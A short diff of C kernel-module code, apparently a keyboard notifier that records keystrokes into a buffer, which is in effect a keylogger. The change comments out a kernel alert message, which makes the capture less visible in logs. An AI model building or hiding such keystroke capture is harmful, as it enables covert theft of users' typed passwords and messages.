@@ -249,7 +249,7 @@ int notifier(struct notifier_block *block, unsigned long code, void *p)
         len = keycode_to_string(param->value, param->shift, keybuffer) ;  
         if (strlen(keybuffer)> 0 && len)
         {
-            printk(KERN_ALERT "notifer type to msg ptr");
+            //printk(KERN_ALERT "notifer type to msg ptr");
             strncpy(msg_Ptr+ buf_pos, keybuffer, len);
             buf_pos+=len;
             
